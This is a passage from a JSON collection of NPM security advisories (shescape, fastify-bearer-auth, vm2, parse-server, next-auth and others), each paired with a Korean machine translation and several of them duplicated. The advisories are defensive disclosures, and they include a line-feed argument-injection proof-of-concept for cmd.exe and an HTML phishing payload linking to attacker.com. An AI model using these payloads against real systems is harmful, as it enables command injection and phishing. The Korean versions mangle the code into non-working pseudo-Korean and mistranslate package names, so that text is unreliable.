https://github.com/ericcornelissen/shescape/pull/322\n  - 동작 1(Bash, Dash, Zsh): https://github.com/ericcornelissen/shescape/pull/324\n  - 동작 2, 3, 4(_any shell_): https://github.com/ericcornelissen/shescape/pull/332\n- https://github.com/ericcornelissen/shescape/issues에서 문제 열기(_New issue_ > _Question_ > _Get started_)\n- 이 권고에서 CMD가 누락된 경우 https://github.com/ericcornelissen/shescape/security/advisories/GHSA-jjc5-fp7p-6f8w를 참조하세요.\n\n[v1.5.7]: https://github.com/ericcornelissen/shescape/releases/tag/v1.5.7\n[v1.5.8]: https://github.com/ericcornelissen/shescape/releases/tag/v1.5.8"
  },
  {
    "description": "### Impact\n\nThis impacts users that use Shescape (any API function) to escape arguments for **cmd.exe** on **Windows**. An attacker can omit all arguments following their input by including a line feed character (`'\\n'`) in the payload. Example:\n\n```javascript\nimport cp from \"node:child_process\";\nimport * as shescape from \"shescape\";\n\n// 1. Prerequisites\nconst options = {\n  shell: \"cmd.exe\",\n};\n\n// 2. Attack\nconst payload = \"attacker\\n\";\n\n// 3. Usage\nlet escapedPayload;\nescapedPayload = shescape.escape(payload, options);\n// Or\nescapedPayload = shescape.escapeAll([payload], options)[0];\n// Or\nescapedPayload = shescape.quote(payload, options);\n// Or\nescapedPayload = shescape.quoteAll([payload], options)[0];\n\ncp.execSync(`echo Hello ${escapedPayload}! How are you doing?`, options);\n// Outputs:  \"Hello attacker\"\n```\n\n> **Note**: `execSync` is just illustrative here, all of `exec`, `execFile`, `execFileSync`, `fork`, `spawn`, and `spawnSync` can be attacked using a line feed character if CMD is the shell being used.\n\n### Patches\n\nThis bug has been patched in [v1.5.8] which you can upgrade to now. No further changes are required.\n\n### Workarounds\n\nAlternatively, line feed characters (`'\\n'`) can be stripped out manually or the user input can be made the last argument (this only limits the impact).\n\n### References\n\n- https://github.com/ericcornelissen/shescape/pull/332\n- https://github.com/ericcornelissen/shescape/releases/tag/v1.5.8\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Comment on https://github.com/ericcornelissen/shescape/pull/332\n- Open an issue at https://github.com/ericcornelissen/shescape/issues (_New issue_ > _Question_ > _Get started_)\n\n[v1.5.8]: https://github.com/ericcornelissen/shescape/releases/tag/v1.5.8\n",
    "identifiers": "GHSA : GHSA-jjc5-fp7p-6f8w\nCVE : CVE-2022-31179",
    "severity": "HIGH",
    "updatedAt": "2023-04-06T21:36:40Z",
    "publishedAt": "2022-07-15T21:39:14Z",
    "references": "https://github.com/ericcornelissen/shescape/security/advisories/GHSA-jjc5-fp7p-6f8w\nhttps://github.com/ericcornelissen/shescape/pull/332\nhttps://github.com/ericcornelissen/shescape/releases/tag/v1.5.8\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31179\nhttps://github.com/ericcornelissen/shescape/commit/aceea7358f7222984e21260381ebc5ec4543b76f\nhttps://github.com/advisories/GHSA-jjc5-fp7p-6f8w",
    "name": "shescape",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.5.8",
    "identifier": "1.5.8",
    "descriptionKR": "### 영향\n\n이는 Shescape(모든 API 함수)를 사용하여 **Windows**에서 **cmd.exe**에 대한 인수를 이스케이프하는 사용자에게 영향을 미칩니다. 공격자는 페이로드에 줄 바꿈 문자(`'\\n'`)를 포함하여 입력 후 모든 인수를 생략할 수 있습니다. 예:\n\n```자바스크립트\n\"node:child_process\"에서 cp 가져오기;\n\"shescape\"에서 *를 shescape로 가져오기;\n\n// 1. 전제 조건\nconst 옵션 = {\n  쉘: \"cmd.exe\",\n};\n\n// 2. 공격\nconst 페이로드 = \"공격자\\n\";\n\n// 3. 사용법\nlet escapedPayload;\nescapedPayload = shescape.escape(페이로드, 옵션);\n// 또는\nescapedPayload = shescape.escapeAll([페이로드], 옵션)[0];\n// 또는\nescapedPayload = shescape.quote(페이로드, 옵션);\n// 또는\nescapedPayload = shescape.quoteAll([페이로드], 옵션)[0];\n\ncp.execSync(`echo Hello ${escapedPayload}! 어떻게 지내세요?`, options);\n// 출력: \"안녕 공격자\"\n```\n\n> **참고**: `execSync`는 여기서 예시일 뿐입니다. 모든 `exec`, `execFile`, `execFileSync`, `fork`, `spawn` 및 `spawnSync`는 다음과 같은 경우 라인 피드 문자를 사용하여 공격할 수 있습니다. CMD는 사용 중인 쉘입니다.\n\n### 패치\n\n이 버그는 지금 업그레이드할 수 있는 [v1.5.8]에서 패치되었습니다. 추가 변경이 필요하지 않습니다.\n\n### 해결 방법\n\n또는 줄 바꿈 문자(`'\\n'`)를 수동으로 제거하거나 사용자 입력을 마지막 인수로 만들 수 있습니다(이는 영향을 제한할 뿐입니다).\n\n### 참조\n\n- https://github.com/ericcornelissen/shescape/pull/332\n- https://github.com/ericcornelissen/shescape/releases/tag/v1.5.8\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n- https://github.com/ericcornelissen/shescape/pull/332에 댓글 달기\n- https://github.com/ericcornelissen/shescape/issues에서 문제 열기(_New issue_ > _Question_ > _Get started_)\n\n[v1.5.8]: https://github.com/ericcornelissen/shescape/releases/tag/v1.5.8"
  },
  {
    "description": "This affects versions of package `json-pointer` up to and including `0.6.1`. A type confusion vulnerability can lead to a bypass of CVE-2020-7709 when the pointer components are arrays.",
    "identifiers": "GHSA : GHSA-v5vg-g7rq-363w\nCVE : CVE-2021-23820",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:01:59Z",
    "publishedAt": "2021-11-08T17:40:49Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-23820\nhttps://github.com/manuelstofer/json-pointer/blob/master/index.js%23L78\nhttps://snyk.io/vuln/SNYK-JS-JSONPOINTER-1577287\nhttps://github.com/manuelstofer/json-pointer/pull/36\nhttps://github.com/manuelstofer/json-pointer/commit/931b0f9c7178ca09778087b4b0ac7e4f505620c2\nhttps://github.com/advisories/GHSA-v5vg-g7rq-363w",
    "name": "json-pointer",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.6.1",
    "identifier": "0.6.2",
    "descriptionKR": "이는 `0.6.1`까지의 `json-pointer` 패키지 버전에 영향을 미칩니다. 포인터 구성 요소가 배열인 경우 형식 혼동 취약성으로 인해 CVE-2020-7709를 우회할 수 있습니다."
  },
  {
    "description": "### Impact\n\nfastify-bearer-auth does not securely use crypto.timingSafeEqual. A malicious attacker could estimate the length of one valid bearer token. According to the corresponding RFC 6750, the bearer token has only base64 valid characters, reducing the range of characters for a brute force attack.\n\nAll versions of fastify-bearer-auth are also affected.\n\n### Patches\n\nWe released:\n\n* v8.0.1 with a fix for the Fastify v4 line\n* v7.0.2 with a fix for the Fastify v3 line\n\n### Workarounds\n\nThere are no workarounds. Update your dependencies.\n\n### References\n\nhttps://hackerone.com/reports/1633287\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [https://github.com/fastify/fastify-bearer-auth](https://github.com/fastify/fastify-bearer-auth)\n* Email us at [hello@matteocollina.com](mailto:hello@matteocollina.com)\n",
    "identifiers": "GHSA : GHSA-376v-xgjx-7mfr\nCVE : CVE-2022-31142",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:05:26Z",
    "publishedAt": "2022-07-15T19:14:27Z",
    "references": "https://github.com/fastify/fastify-bearer-auth/security/advisories/GHSA-376v-xgjx-7mfr\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31142\nhttps://github.com/fastify/fastify-bearer-auth/commit/0c468a616d7e56126dc468150f6a5a92e530b8e4\nhttps://github.com/fastify/fastify-bearer-auth/commit/39353b15409ee99474545f615ffb16180cf3b716\nhttps://github.com/fastify/fastify-bearer-auth/commit/f921a0582dc83112039004a9b5041141b50c5b3f\nhttps://hackerone.com/reports/1633287\nhttps://github.com/advisories/GHSA-376v-xgjx-7mfr",
    "name": "@fastify/bearer-auth",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 8.0.0",
    "identifier": "8.0.1",
    "descriptionKR": "### 영향\n\nfastify-bearer-auth는 crypto.timingSafeEqual을 안전하게 사용하지 않습니다. 악의적인 공격자는 하나의 유효한 전달자 토큰의 길이를 추정할 수 있습니다. 해당 RFC 6750에 따르면 전달자 토큰에는 base64 유효 문자만 있어 무차별 암호 대입 공격의 문자 범위가 줄어듭니다.\n\nfastify-bearer-auth의 모든 버전도 영향을 받습니다.\n\n### 패치\n\n출시:\n\n* v8.0.1 Fastify v4 라인 수정\n* Fastify v3 라인에 대한 수정이 포함된 v7.0.2\n\n### 해결 방법\n\n해결 방법이 없습니다. 종속성을 업데이트합니다.\n\n### 참조\n\nhttps://hackerone.com/reports/1633287\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [https://github.com/fastify/fastify-bearer-auth](https://github.com/fastify/fastify-bearer-auth)에서 이슈 열기\n* [hello@matteocollina.com](mailto:hello@matteocollina.com)으로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\n\nfastify-bearer-auth does not securely use crypto.timingSafeEqual. A malicious attacker could estimate the length of one valid bearer token. According to the corresponding RFC 6750, the bearer token has only base64 valid characters, reducing the range of characters for a brute force attack.\n\nAll versions of fastify-bearer-auth are also affected.\n\n### Patches\n\nWe released:\n\n* v8.0.1 with a fix for the Fastify v4 line\n* v7.0.2 with a fix for the Fastify v3 line\n\n### Workarounds\n\nThere are no workarounds. Update your dependencies.\n\n### References\n\nhttps://hackerone.com/reports/1633287\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [https://github.com/fastify/fastify-bearer-auth](https://github.com/fastify/fastify-bearer-auth)\n* Email us at [hello@matteocollina.com](mailto:hello@matteocollina.com)\n",
    "identifiers": "GHSA : GHSA-376v-xgjx-7mfr\nCVE : CVE-2022-31142",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:05:26Z",
    "publishedAt": "2022-07-15T19:14:27Z",
    "references": "https://github.com/fastify/fastify-bearer-auth/security/advisories/GHSA-376v-xgjx-7mfr\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31142\nhttps://github.com/fastify/fastify-bearer-auth/commit/0c468a616d7e56126dc468150f6a5a92e530b8e4\nhttps://github.com/fastify/fastify-bearer-auth/commit/39353b15409ee99474545f615ffb16180cf3b716\nhttps://github.com/fastify/fastify-bearer-auth/commit/f921a0582dc83112039004a9b5041141b50c5b3f\nhttps://hackerone.com/reports/1633287\nhttps://github.com/advisories/GHSA-376v-xgjx-7mfr",
    "name": "@fastify/bearer-auth",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 7.0.2",
    "identifier": "7.0.2",
    "descriptionKR": "### 영향\n\nfastify-bearer-auth는 crypto.timingSafeEqual을 안전하게 사용하지 않습니다. 악의적인 공격자는 하나의 유효한 전달자 토큰의 길이를 추정할 수 있습니다. 해당 RFC 6750에 따르면 전달자 토큰에는 base64 유효 문자만 있어 무차별 암호 대입 공격의 문자 범위가 줄어듭니다.\n\nfastify-bearer-auth의 모든 버전도 영향을 받습니다.\n\n### 패치\n\n출시:\n\n* v8.0.1 Fastify v4 라인 수정\n* Fastify v3 라인에 대한 수정이 포함된 v7.0.2\n\n### 해결 방법\n\n해결 방법이 없습니다. 종속성을 업데이트합니다.\n\n### 참조\n\nhttps://hackerone.com/reports/1633287\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [https://github.com/fastify/fastify-bearer-auth](https://github.com/fastify/fastify-bearer-auth)에서 이슈 열기\n* [hello@matteocollina.com](mailto:hello@matteocollina.com)으로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\n\nfastify-bearer-auth does not securely use crypto.timingSafeEqual. A malicious attacker could estimate the length of one valid bearer token. According to the corresponding RFC 6750, the bearer token has only base64 valid characters, reducing the range of characters for a brute force attack.\n\nAll versions of fastify-bearer-auth are also affected.\n\n### Patches\n\nWe released:\n\n* v8.0.1 with a fix for the Fastify v4 line\n* v7.0.2 with a fix for the Fastify v3 line\n\n### Workarounds\n\nThere are no workarounds. Update your dependencies.\n\n### References\n\nhttps://hackerone.com/reports/1633287\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [https://github.com/fastify/fastify-bearer-auth](https://github.com/fastify/fastify-bearer-auth)\n* Email us at [hello@matteocollina.com](mailto:hello@matteocollina.com)\n",
    "identifiers": "GHSA : GHSA-376v-xgjx-7mfr\nCVE : CVE-2022-31142",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:05:26Z",
    "publishedAt": "2022-07-15T19:14:27Z",
    "references": "https://github.com/fastify/fastify-bearer-auth/security/advisories/GHSA-376v-xgjx-7mfr\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31142\nhttps://github.com/fastify/fastify-bearer-auth/commit/0c468a616d7e56126dc468150f6a5a92e530b8e4\nhttps://github.com/fastify/fastify-bearer-auth/commit/39353b15409ee99474545f615ffb16180cf3b716\nhttps://github.com/fastify/fastify-bearer-auth/commit/f921a0582dc83112039004a9b5041141b50c5b3f\nhttps://hackerone.com/reports/1633287\nhttps://github.com/advisories/GHSA-376v-xgjx-7mfr",
    "name": "fastify-bearer-auth",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.1, <= 6.0.3",
    "descriptionKR": "### 영향\n\nfastify-bearer-auth는 crypto.timingSafeEqual을 안전하게 사용하지 않습니다. 악의적인 공격자는 하나의 유효한 전달자 토큰의 길이를 추정할 수 있습니다. 해당 RFC 6750에 따르면 전달자 토큰에는 base64 유효 문자만 있어 무차별 암호 대입 공격의 문자 범위가 줄어듭니다.\n\nfastify-bearer-auth의 모든 버전도 영향을 받습니다.\n\n### 패치\n\n출시:\n\n* v8.0.1 Fastify v4 라인 수정\n* Fastify v3 라인에 대한 수정이 포함된 v7.0.2\n\n### 해결 방법\n\n해결 방법이 없습니다. 종속성을 업데이트합니다.\n\n### 참조\n\nhttps://hackerone.com/reports/1633287\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [https://github.com/fastify/fastify-bearer-auth](https://github.com/fastify/fastify-bearer-auth)에서 이슈 열기\n* [hello@matteocollina.com](mailto:hello@matteocollina.com)으로 이메일을 보내주세요."
  },
  {
    "description": "This affects the package vm2 before 3.6.11. It is possible to trigger a RangeError exception from the host rather than the \"sandboxed\" context by reaching the stack call limit with an infinite recursion. The returned object is then used to reference the mainModule property of the host code running the script allowing it to spawn a child_process and execute arbitrary code.",
    "identifiers": "GHSA : GHSA-wf5x-cr3r-xr77\nCVE : CVE-2019-10761",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:05:25Z",
    "publishedAt": "2022-07-14T00:00:23Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-10761\nhttps://github.com/patriksimek/vm2/issues/197\nhttps://github.com/patriksimek/vm2/commit/4b22d704e4794af63a5a2d633385fd20948f6f90\nhttps://snyk.io/vuln/SNYK-JS-VM2-473188\nhttps://github.com/patriksimek/vm2/issues/197#issuecomment-480643832\nhttps://gist.github.com/JLLeitschuh/609bb2efaff22ed84fe182cf574c023a\nhttps://github.com/advisories/GHSA-wf5x-cr3r-xr77",
    "name": "vm2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.6.11",
    "identifier": "3.6.11",
    "descriptionKR": "이것은 3.6.11 이전의 패키지 vm2에 영향을 미칩니다. 무한 재귀로 스택 호출 제한에 도달하여 \"샌드박스\" 컨텍스트가 아닌 호스트에서 RangeError 예외를 트리거할 수 있습니다. 그런 다음 반환된 개체는 스크립트를 실행하는 호스트 코드의 mainModule 속성을 참조하는 데 사용되어 child_process를 생성하고 임의의 코드를 실행할 수 있습니다."
  },
  {
    "description": "The package svelte before 3.49.0 is vulnerable to Cross-site Scripting (XSS) due to improper input sanitization and to improper escape of attributes when using objects during SSR (Server-Side Rendering). Exploiting this vulnerability is possible via objects with a custom toString() function.",
    "identifiers": "GHSA : GHSA-wv8q-r932-8hc7\nCVE : CVE-2022-25875",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:05:46Z",
    "publishedAt": "2022-07-13T00:00:41Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25875\nhttps://github.com/sveltejs/svelte/commit/f8605d6acbf66976da9b4547f76e90e163899907\nhttps://snyk.io/vuln/SNYK-JS-SVELTE-2931080\nhttps://github.com/sveltejs/svelte/pull/7530#23issuecomment-1158575990\nhttps://github.com/advisories/GHSA-wv8q-r932-8hc7",
    "name": "svelte",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.49.0",
    "identifier": "3.49.0",
    "descriptionKR": "3.49.0 이전의 패키지 svelte는 부적절한 입력 삭제 및 SSR(Server-Side Rendering) 동안 개체를 사용할 때 속성의 부적절한 이스케이프 때문에 XSS(Cross-site Scripting)에 취약합니다. 사용자 지정 toString() 함수가 있는 개체를 통해 이 취약점을 악용할 수 있습니다."
  },
  {
    "description": "This affects the package passport before 0.6.0. When a user logs in or logs out, the session is regenerated instead of being closed.",
    "identifiers": "GHSA : GHSA-v923-w3x8-wh69\nCVE : CVE-2022-25896",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:04:51Z",
    "publishedAt": "2022-07-02T00:00:19Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25896\nhttps://github.com/jaredhanson/passport/pull/900\nhttps://github.com/jaredhanson/passport/commit/7e9b9cf4d7be02428e963fc729496a45baeea608\nhttps://snyk.io/vuln/SNYK-JS-PASSPORT-2840631\nhttps://github.com/advisories/GHSA-v923-w3x8-wh69",
    "name": "passport",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.6.0",
    "identifier": "0.6.0",
    "descriptionKR": "이는 0.6.0 이전의 패키지 여권에 영향을 미칩니다. 사용자가 로그인하거나 로그아웃하면 세션이 닫히지 않고 다시 생성됩니다."
  },
  {
    "description": "The package link-preview-js before 2.1.17 are vulnerable to Server-side Request Forgery (SSRF) which allows attackers to send arbitrary requests to the local network and read the response. This is due to flawed DNS rebinding protection.",
    "identifiers": "GHSA : GHSA-h9cw-7g8j-h66h\nCVE : CVE-2022-25876",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:05:20Z",
    "publishedAt": "2022-07-02T00:00:19Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25876\nhttps://github.com/ospfranco/link-preview-js/issues/115\nhttps://github.com/ospfranco/link-preview-js/pull/117\nhttps://snyk.io/vuln/SNYK-JS-LINKPREVIEWJS-2933520\nhttps://github.com/advisories/GHSA-h9cw-7g8j-h66h",
    "name": "link-preview-js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.1.17",
    "identifier": "2.1.17",
    "descriptionKR": "2.1.17 이전의 패키지 link-preview-js는 공격자가 로컬 네트워크에 임의의 요청을 보내고 응답을 읽을 수 있는 SSRF(Server-side Request Forgery)에 취약합니다. 이는 결함이 있는 DNS 리바인딩 보호 때문입니다."
  },
  {
    "description": "swagger-ui has XSS in key names",
    "identifiers": "GHSA : GHSA-h8wp-wgcq-qhrf\nCVE : CVE-2016-1000229",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:02:33Z",
    "publishedAt": "2022-05-24T17:04:48Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000229\nhttps://access.redhat.com/errata/RHSA-2017:0868\nhttps://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-1000229\nhttps://github.com/advisories/GHSA-h8wp-wgcq-qhrf",
    "name": "swagger-ui",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.2.1",
    "identifier": "2.2.1",
    "descriptionKR": "swagger-ui에는 키 이름에 XSS가 있습니다."
  },
  {
    "description": "In Select2 through 4.0.5, as used in Snipe-IT and other products, rich selectlists allow XSS. This affects use cases with Ajax remote data loading when HTML templates are used to display listbox data.",
    "identifiers": "GHSA : GHSA-rf66-hmqf-q3fc\nCVE : CVE-2016-10744",
    "severity": "MODERATE",
    "updatedAt": "2023-01-27T05:02:36Z",
    "publishedAt": "2022-05-14T01:14:56Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2016-10744\nhttps://github.com/select2/select2/issues/4587\nhttps://github.com/snipe/snipe-it/pull/6831\nhttps://github.com/snipe/snipe-it/pull/6831/commits/5848d9a10c7d62c73ff6a3858edfae96a429402a\nhttps://github.com/advisories/GHSA-rf66-hmqf-q3fc",
    "name": "select2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.0.6",
    "identifier": "4.0.6",
    "descriptionKR": "Snipe-IT 및 기타 제품에서 사용되는 Select2 ~ 4.0.5에서는 풍부한 선택 목록이 XSS를 허용합니다. 이는 HTML 템플릿을 사용하여 목록 상자 데이터를 표시할 때 Ajax 원격 데이터 로드 사용 사례에 영향을 미칩니다."
  },
  {
    "description": "### Impact\n\nParse Server LiveQuery does not remove protected fields in classes, passing them to the client.\n\n### Patches\nThe LiveQueryController now removes protected fields from the client response.\n\n### Workarounds\nUse `Parse.Cloud.afterLiveQueryEvent` to manually remove protected fields.\n\n### References\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-crrq-vr9j-fxxh\n- https://github.com/parse-community/parse-server\n\n### For more information\nIf you have any questions or comments about this advisory:\n- For questions or comments about this vulnerability visit our [community forum](http://community.parseplatform.org/) or [community chat](http://chat.parseplatform.org/)\n- Report other vulnerabilities at [report.parseplatform.org](https://report.parseplatform.org/)\n",
    "identifiers": "GHSA : GHSA-crrq-vr9j-fxxh\nCVE : CVE-2022-31112",
    "severity": "HIGH",
    "updatedAt": "2023-07-24T19:37:44Z",
    "publishedAt": "2022-07-06T19:52:23Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-crrq-vr9j-fxxh\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31112\nhttps://github.com/parse-community/parse-server/issues/8073\nhttps://github.com/parse-community/parse-server/pull/8074\nhttps://github.com/parse-community/parse-server/commit/309f64ced8700321df056fb3cc97f15007a00df1\nhttps://github.com/parse-community/parse-server/commit/9fd4516cde5c742f9f29dd05468b4a43a85639a6\nhttps://github.com/parse-community/parse-server/releases/tag/5.2.4\nhttps://github.com/parse-community/parse-server/commit/054f3e6ab01d66a0dcfb77725af28eac1485b375\nhttps://github.com/advisories/GHSA-crrq-vr9j-fxxh",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.2.4",
    "identifier": "5.2.4",
    "descriptionKR": "### 영향\n\nParse Server LiveQuery는 클래스에서 보호된 필드를 제거하지 않고 클라이언트에 전달합니다.\n\n### 패치\nLiveQueryController는 이제 클라이언트 응답에서 보호된 필드를 제거합니다.\n\n### 해결 방법\n보호된 필드를 수동으로 제거하려면 `Parse.Cloud.afterLiveQueryEvent`를 사용하십시오.\n\n### 참조\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-crrq-vr9j-fxxh\n- https://github.com/parse-community/parse-server\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n- 이 취약점에 대한 질문이나 의견이 있으시면 [커뮤니티 포럼](http://community.parseplatform.org/) 또는 [커뮤니티 채팅](http://chat.parseplatform.org/)을 방문하십시오.\n- [report.parseplatform.org](https://report.parseplatform.org/)에서 다른 취약점을 보고하세요."
  },
  {
    "description": "### Impact\n\nParse Server LiveQuery does not remove protected fields in classes, passing them to the client.\n\n### Patches\nThe LiveQueryController now removes protected fields from the client response.\n\n### Workarounds\nUse `Parse.Cloud.afterLiveQueryEvent` to manually remove protected fields.\n\n### References\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-crrq-vr9j-fxxh\n- https://github.com/parse-community/parse-server\n\n### For more information\nIf you have any questions or comments about this advisory:\n- For questions or comments about this vulnerability visit our [community forum](http://community.parseplatform.org/) or [community chat](http://chat.parseplatform.org/)\n- Report other vulnerabilities at [report.parseplatform.org](https://report.parseplatform.org/)\n",
    "identifiers": "GHSA : GHSA-crrq-vr9j-fxxh\nCVE : CVE-2022-31112",
    "severity": "HIGH",
    "updatedAt": "2023-07-24T19:37:44Z",
    "publishedAt": "2022-07-06T19:52:23Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-crrq-vr9j-fxxh\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31112\nhttps://github.com/parse-community/parse-server/issues/8073\nhttps://github.com/parse-community/parse-server/pull/8074\nhttps://github.com/parse-community/parse-server/commit/309f64ced8700321df056fb3cc97f15007a00df1\nhttps://github.com/parse-community/parse-server/commit/9fd4516cde5c742f9f29dd05468b4a43a85639a6\nhttps://github.com/parse-community/parse-server/releases/tag/5.2.4\nhttps://github.com/parse-community/parse-server/commit/054f3e6ab01d66a0dcfb77725af28eac1485b375\nhttps://github.com/advisories/GHSA-crrq-vr9j-fxxh",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.10.13",
    "identifier": "4.10.13",
    "descriptionKR": "### 영향\n\nParse Server LiveQuery는 클래스에서 보호된 필드를 제거하지 않고 클라이언트에 전달합니다.\n\n### 패치\nLiveQueryController는 이제 클라이언트 응답에서 보호된 필드를 제거합니다.\n\n### 해결 방법\n보호된 필드를 수동으로 제거하려면 `Parse.Cloud.afterLiveQueryEvent`를 사용하십시오.\n\n### 참조\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-crrq-vr9j-fxxh\n- https://github.com/parse-community/parse-server\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n- 이 취약점에 대한 질문이나 의견이 있으시면 [커뮤니티 포럼](http://community.parseplatform.org/) 또는 [커뮤니티 채팅](http://chat.parseplatform.org/)을 방문하십시오.\n- [report.parseplatform.org](https://report.parseplatform.org/)에서 다른 취약점을 보고하세요."
  },
  {
    "description": "deep.assign npm package 0.0.0-alpha.0 is vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution').",
    "identifiers": "GHSA : GHSA-3829-mgmw-jcg4\nCVE : CVE-2021-40663",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-29T05:06:02Z",
    "publishedAt": "2022-07-01T00:01:14Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-40663\nhttps://github.com/janbialostok/deep-assign/issues/1\nhttps://www.npmjs.com/package/deep.assign\nhttps://security.netapp.com/advisory/ntap-20220826-0002/\nhttps://github.com/advisories/GHSA-3829-mgmw-jcg4",
    "name": "deep.assign",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 0.0.0-alpha.0",
    "descriptionKR": "deep.assign npm 패키지 0.0.0-alpha.0은 객체 프로토타입 속성의 부적절하게 제어된 수정('프로토타입 오염')에 취약합니다."
  },
  {
    "description": "All versions of package git-clone are vulnerable to Command Injection due to insecure usage of the --upload-pack feature of git.\n## Credits\n\nCredit to @lirantal for discovering this vulnerability.",
    "identifiers": "GHSA : GHSA-8jmw-wjr8-2x66\nCVE : CVE-2022-25900",
    "severity": "HIGH",
    "updatedAt": "2023-02-01T05:01:41Z",
    "publishedAt": "2022-07-02T00:00:19Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25900\nhttps://gist.github.com/lirantal/9441f3a1212728476f7a6caa4acb2ccc\nhttps://snyk.io/vuln/SNYK-JS-GITCLONE-2434308\nhttps://github.com/advisories/GHSA-8jmw-wjr8-2x66",
    "name": "git-clone",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.2.0",
    "descriptionKR": "git-clone 패키지의 모든 버전은 git의 --upload-pack 기능을 안전하지 않게 사용하기 때문에 명령 주입에 취약합니다.\n## 학점\n\n이 취약점을 발견한 @lirantal 덕분입니다."
  },
  {
    "description": "### Impact\n\nAn attacker can pass a compromised input to the e-mail [signin endpoint](https://next-auth.js.org/getting-started/rest-api#post-apiauthsigninprovider) that contains some malicious HTML, tricking the e-mail server to send it to the user, so they can perform a phishing attack. Eg.: `balazs@email.com, <a href=\"http://attacker.com\">Before signing in, claim your money!</a>`. This was previously sent to `balazs@email.com`, and the content of the email containing a link to the attacker's site was rendered in the HTML. This has been remedied in the following releases, by simply not rendering that e-mail in the HTML, since it should be obvious to the receiver what e-mail they used:\n\nnext-auth v3 users before version 3.29.8 are impacted. (We recommend upgrading to v4, as v3 is considered unmaintained. See our [migration guide](https://next-auth.js.org/getting-started/upgrade-v4))\n\nnext-auth v4 users before version 4.8.0 are impacted.\n\n### Patches\n\nWe've released patches for this vulnerability in:\n  \n- v3 - `3.29.8`\n- v4 - `4.9.0`\n\nYou can do:\n\n```sh\nnpm i next-auth@latest\n# or\nyarn add next-auth@latest\n#\npnpm add next-auth@latest\n```\n\n(This will update to the latest v4 version, but you can change  `latest` to `3` if you want to stay on v3. This is not recommended.)\n\n### Workarounds\n\nIf for some reason you cannot upgrade, the workaround requires you to sanitize the `email` parameter that is passed to `sendVerificationRequest` and rendered in the HTML. If you haven't created a custom `sendVerificationRequest`, you only need to upgrade. Otherwise, make sure to either exclude `email` from the HTML body or efficiently sanitize it. Check out https://next-auth.js.org/providers/email#customizing-emails\n\n### References\n\n\nRelated documentation:\n\n- https://next-auth.js.org/providers/email#customizing-emails\n- https://next-auth.js.org/getting-started/upgrade-v4\n\nA test case has been added so this kind of issue will be checked before publishing. See: https://github.com/nextauthjs/next-auth/blob/cd6ccfde898037290ae949d500ace8a378376cd8/packages/next-auth/tests/email.test.ts\n\n### For more information\n\nIf you have any concerns, we request responsible disclosure, outlined here: https://next-auth.js.org/security#reporting-a-vulnerability\n\n### Timeline\n\nThe issue was reported 2022 June 29th, a response was sent out to the reporter in less than 1 hour, and after identifying the issue a patch was published within 4 working days.",
    "identifiers": "GHSA : GHSA-pgjx-7f9g-9463\nCVE : CVE-2022-31127",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:05:13Z",
